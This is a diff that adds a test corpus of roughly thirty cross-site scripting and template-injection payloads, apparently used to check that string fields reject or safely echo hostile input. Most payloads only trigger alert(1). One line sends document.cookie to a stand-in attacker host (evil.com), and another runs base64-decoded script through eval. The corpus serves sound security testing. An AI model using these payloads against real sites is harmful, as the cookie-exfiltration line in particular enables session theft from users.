@@ -1,0 +1,30 @@
+# XSS corpus — OWASP-derived payloads for injection testing
+# Feed to string fields and verify: 400/safe-echo, never 500
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(document.cookie)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+{{constructor.constructor('alert(1)')()}}
+${7*7}
+#{7*7}
+<script>fetch('https://evil.com/'+document.cookie)</script>
+"><img src=1 onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+</textarea><script>alert(1)</script>
+<details open ontoggle=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+<object data="javascript:alert(1)">
+<script>eval(atob('YWxlcnQoMSk='))</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+<script>alert(1)</script>
+<scr\0ipt>alert(1)</scr\0ipt>
+<scr ipt>alert(1)</scr ipt>
